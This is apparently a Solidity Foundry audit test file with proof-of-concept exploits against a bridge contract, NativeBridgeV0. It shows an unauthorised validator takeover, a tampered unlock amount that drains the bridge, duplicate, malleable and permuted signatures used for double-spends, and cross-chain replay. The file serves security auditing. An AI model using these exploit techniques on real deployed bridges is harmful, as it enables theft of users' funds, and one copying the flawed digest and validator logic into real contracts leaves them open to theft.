// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test, Vm} from "forge-std/Test.sol";
import {HarborToken} from "../src/token/HarborToken.sol";
import {NativeBridgeV0} from "../src/NativeBridgeV0.sol";
import {Message} from "../src/interfaces/IHarborBridge.sol";

/// @title AuditV0Test
/// @notice Proof-of-concept tests proving the security vulnerabilities and failure modes
///         in NativeBridgeV0.
contract AuditV0Test is Test {
    uint256 internal constant CHAIN_A = 8453200012;
    uint256 internal constant CHAIN_B = 1002;
    uint256 internal constant THRESHOLD = 2;

    address internal admin = makeAddr("admin");
    address internal alice = makeAddr("alice");
    address internal attacker = makeAddr("attacker");

    uint256[] internal validatorKeys;
    address[] internal validatorAddresses;

    HarborToken internal token;
    NativeBridgeV0 internal v0;

    function setUp() public {
        _createValidators(3);

        vm.chainId(CHAIN_A);
        token = new HarborToken(admin, admin);
        v0 = new NativeBridgeV0(address(token), validatorAddresses, THRESHOLD, admin);

        // Fund bridge with initial liquidity
        vm.prank(admin);
        token.transfer(address(v0), 10_000 ether);

        // Fund alice
        vm.prank(admin);
        token.transfer(alice, 100 ether);
    }

    /// Vulnerability 1: setValidators has no access control (CRITICAL)
    /// Any unprivileged attacker can replace the validator set and threshold.
    function test_V0_Exploit_NoAccessControlOnSetValidators() public {
        address[] memory fakeValidators = new address[](1);
        fakeValidators[0] = attacker;

        // Attacker calls setValidators directly
        vm.prank(attacker);
        v0.setValidators(fakeValidators, 1);

        assertTrue(v0.isValidator(attacker));
        assertEq(v0.threshold(), 1);
    }

    /// Vulnerability 2: setValidators does not remove old validators (CRITICAL)
    /// Revoked validators retain signing privileges forever.
    function test_V0_Exploit_SetValidatorsDoesNotRemoveOldValidators() public {
        address oldValidator = validatorAddresses[0];
        assertTrue(v0.isValidator(oldValidator));

        // Admin updates validators to a completely new set
        address[] memory newValidators = new address[](2);
        newValidators[0] = makeAddr("valNew1");
        newValidators[1] = makeAddr("valNew2");

        v0.setValidators(newValidators, 2);

        // The old revoked validator is STILL authorized!
        assertTrue(v0.isValidator(oldValidator));
    }

    /// Vulnerability 3: Digest excludes amount (CRITICAL)
    /// An attacker can intercept a 1 HBR unlock and change message.amount to 10,000 HBR,
    /// draining the entire bridge because the digest only encodes (nonce, recipient).
    function test_V0_Exploit_AmountNotInDigest_DrainsBridge() public {
        Message memory message = Message({
            srcChainId: CHAIN_B,
            dstChainId: CHAIN_A,
            nonce: 1,
            sender: alice,
            recipient: attacker,
            amount: 1 ether, // Original legitimate amount
            hookGasLimit: 0,
            hookData: ""
        });

        // Validators sign legitimate message for 1 ether
        bytes[] memory sigs = _signV0(message);

        // Attacker tampers with amount to steal all bridge funds
        uint256 bridgeBalance = token.balanceOf(address(v0));
        message.amount = bridgeBalance;

        uint256 attackerBefore = token.balanceOf(attacker);
        v0.unlock(message, sigs);
        uint256 attackerAfter = token.balanceOf(attacker);

        // Attacker successfully drained the entire bridge balance (minus token transfer fee)
        assertGt(attackerAfter, attackerBefore);
        assertEq(token.balanceOf(address(v0)), 0);
    }

    /// Vulnerability 4: Duplicate signatures bypass threshold (CRITICAL)
    /// If only 1 validator key is leaked or compromised, an attacker duplicates the signature
    /// [sig1, sig1] to meet threshold = 2.
    function test_V0_Exploit_DuplicateSignaturesBypassThreshold() public {
        Message memory message = Message({
            srcChainId: CHAIN_B,
            dstChainId: CHAIN_A,
            nonce: 2,
            sender: alice,
            recipient: attacker,
            amount: 100 ether,
            hookGasLimit: 0,
            hookData: ""
        });

        bytes32 digest = keccak256(abi.encode(message.nonce, message.recipient));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(validatorKeys[0], digest);
        bytes memory singleSig = abi.encodePacked(r, s, v);

        // Attacker duplicates the single signature
        bytes[] memory dupSigs = new bytes[](2);
        dupSigs[0] = singleSig;
        dupSigs[1] = singleSig;

        // Bypasses threshold 2 with only 1 validator signature!
        v0.unlock(message, dupSigs);
        assertGt(token.balanceOf(attacker), 0);
    }

    /// Vulnerability 5: Signature malleability bypasses replay protection (CRITICAL)
    /// secp256k1 signature malleability (s' = N - s, v' = v ^ 1) produces a valid signature
    /// with a different hash, bypassing usedSignature[keccak256(signatures[0])].
    function test_V0_Exploit_SignatureMalleabilityDoubleSpend() public {
        Message memory message = Message({
            srcChainId: CHAIN_B,
            dstChainId: CHAIN_A,
            nonce: 3,
            sender: alice,
            recipient: attacker,
            amount: 50 ether,
            hookGasLimit: 0,
            hookData: ""
        });

        bytes32 digest = keccak256(abi.encode(message.nonce, message.recipient));
        (uint8 v1, bytes32 r1, bytes32 s1) = vm.sign(validatorKeys[0], digest);
        (uint8 v2, bytes32 r2, bytes32 s2) = vm.sign(validatorKeys[1], digest);

        bytes[] memory sigs1 = new bytes[](2);
        sigs1[0] = abi.encodePacked(r1, s1, v1);
        sigs1[1] = abi.encodePacked(r2, s2, v2);

        // First unlock succeeds
        v0.unlock(message, sigs1);

        // Attacker creates malleable version of signature 0: s' = N - s, v' = v ^ 1
        uint256 n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;
        bytes32 malleableS1 = bytes32(n - uint256(s1));
        uint8 malleableV1 = v1 == 27 ? 28 : 27;

        bytes[] memory malleableSigs = new bytes[](2);
        malleableSigs[0] = abi.encodePacked(r1, malleableS1, malleableV1);
        malleableSigs[1] = abi.encodePacked(r2, s2, v2);

        // Second unlock with the same message succeeds! Double-spend!
        v0.unlock(message, malleableSigs);
        assertGt(token.balanceOf(attacker), 90 ether);
    }

    /// Vulnerability 6: Permuting signatures bypasses replay protection (CRITICAL)
    /// If validators A, B, C signed: submitting [sigA, sigB] records hash(A).
    /// Submitting [sigB, sigC] records hash(B), allowing double-spending.
    function test_V0_Exploit_SignaturePermutationDoubleSpend() public {
        Message memory message = Message({
            srcChainId: CHAIN_B,
            dstChainId: CHAIN_A,
            nonce: 4,
            sender: alice,
            recipient: attacker,
            amount: 50 ether,
            hookGasLimit: 0,
            hookData: ""
        });

        bytes32 digest = keccak256(abi.encode(message.nonce, message.recipient));
        (uint8 v1, bytes32 r1, bytes32 s1) = vm.sign(validatorKeys[0], digest);
        (uint8 v2, bytes32 r2, bytes32 s2) = vm.sign(validatorKeys[1], digest);
        (uint8 v3, bytes32 r3, bytes32 s3) = vm.sign(validatorKeys[2], digest);

        bytes[] memory sigsAB = new bytes[](2);
        sigsAB[0] = abi.encodePacked(r1, s1, v1);
        sigsAB[1] = abi.encodePacked(r2, s2, v2);

        bytes[] memory sigsBC = new bytes[](2);
        sigsBC[0] = abi.encodePacked(r2, s2, v2);
        sigsBC[1] = abi.encodePacked(r3, s3, v3);

        // First unlock consumes keccak256(sigA)
        v0.unlock(message, sigsAB);

        // Second unlock consumes keccak256(sigB) and succeeds again! Double-spend!
        v0.unlock(message, sigsBC);
        assertGt(token.balanceOf(attacker), 90 ether);
    }

    /// Vulnerability 7: No domain separation (chain ID / bridge address) in digest (CRITICAL)
    /// A signature produced for another chain or a different bridge can be replayed here.
    function test_V0_Exploit_CrossChainAndCrossBridgeReplay() public {
        // Legitimate message intended for Chain 999999
        Message memory crossChainMessage = Message({
            srcChainId: CHAIN_B,
            dstChainId: 999999,
            nonce: 5,
            sender: alice,
            recipient: attacker,
            amount: 50 ether,
            hookGasLimit: 0,
            hookData: ""
        });

        bytes[] memory sigs = _signV0(crossChainMessage);

        // Replayed on Chain A NativeBridgeV0 without any dstChainId verification!
        v0.unlock(crossChainMessage, sigs);
        assertGt(token.balanceOf(attacker), 0);
    }

    // ───────── helpers ─────────

    function _createValidators(uint256 count) internal {
        for (uint256 index; index < count; index++) {
            uint256 key = uint256(keccak256(abi.encode("validator", index)));
            validatorKeys.push(key);
            validatorAddresses.push(vm.addr(key));
        }
        for (uint256 outer = 1; outer < count; outer++) {
            for (uint256 inner = outer; inner > 0 && validatorAddresses[inner - 1] > validatorAddresses[inner]; inner--) {
                (validatorAddresses[inner - 1], validatorAddresses[inner]) =
                    (validatorAddresses[inner], validatorAddresses[inner - 1]);
                (validatorKeys[inner - 1], validatorKeys[inner]) = (validatorKeys[inner], validatorKeys[inner - 1]);
            }
        }
    }

    function _signV0(Message memory message) internal view returns (bytes[] memory signatures) {
        bytes32 digest = keccak256(abi.encode(message.nonce, message.recipient));
        signatures = new bytes[](THRESHOLD);
        for (uint256 index; index < THRESHOLD; index++) {
            (uint8 sigV, bytes32 sigR, bytes32 sigS) = vm.sign(validatorKeys[index], digest);
            signatures[index] = abi.encodePacked(sigR, sigS, sigV);
        }
    }
}
